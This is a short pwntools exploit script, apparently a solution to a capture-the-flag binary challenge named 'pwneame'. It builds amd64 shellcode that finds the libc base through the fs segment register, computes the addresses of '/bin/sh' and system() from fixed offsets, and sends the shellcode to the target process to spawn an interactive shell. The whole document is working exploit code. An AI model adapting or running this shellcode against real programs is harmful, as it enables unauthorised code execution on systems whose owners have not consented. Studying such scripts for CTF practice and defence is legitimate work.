#!/usr/bin/python3
from pwn import process, context, asm

shell = process("./pwneame")
context.arch = "amd64"

shellcode  = b""
shellcode += asm("mov rax, fs:[0x0]")      # $rax = fs segment
shellcode += asm("mov rax, [rax + 0xb20]") # $rax = libc base
shellcode += asm("mov rdi, rax")           # $rdi = libc base
shellcode += asm("add rdi, 0x1d8678")      # $rdi = &"/bin/sh"
shellcode += asm("add rax, 0x50d70")       # $rax = system()
shellcode += asm("add rsp, 0x8")           # align stack
shellcode += asm("call rax")               # system("/bin/sh")

shell.sendlineafter(b": \n", shellcode)
shell.recvlines(3)

shell.interactive()
